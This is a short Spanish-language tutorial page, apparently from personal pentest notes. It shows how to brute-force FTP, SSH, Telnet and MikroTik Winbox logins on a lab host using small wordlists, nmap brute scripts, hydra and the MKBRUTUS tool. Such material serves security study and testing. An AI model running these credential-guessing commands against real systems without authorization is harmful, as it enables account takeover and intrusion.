---
theme: "just-the-docs"
title: "Ataques de Autenticacion/Login"
layout: default
nav_order: 13
parent: "Seguridad Ofensiva"
---
# Ataques de Autenticacion/login
## Creacion de diccionarios/wordlist pequenos para hacer las pruebas
```bash
cd /home/lesand/Desktop/tools/diccionarios  
echo -e "admin\nroot" > usuarios.txt
echo -e "lesand2222\nlesand3333\nlesand1111\nlesand4321\nlesand1234\nlesand2020\nlesand2022\nlesand2023\nlesand2024\nlesand2025" > dicc.txt
```
## FTP
### NMAP
```bash
nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
## Hydra
```bash
hydra -L usuarios.txt -P dicc.txt ftp://192.168.85.134
```
## SSH
### NMAP
```bash
nmap -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
## TELNET
### NMAP
```bash
nmap -p 23 --script telnet-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
## Hydra
```bash
hydra -L usuarios.txt -P dicc.txt telnet://192.168.85.134
```
## Winbox/API Mikrotik
### MKBRUTUS
```bash
cd /home/lesand/Desktop/tools
git clone https://github.com/mkbrutusproject/MKBRUTUS.git
cd MKBRUTUS
python3 mkbrutus.py -t 192.168.85.134 -d /home/lesand/Desktop/tools/diccionarios/dicc.txt
```
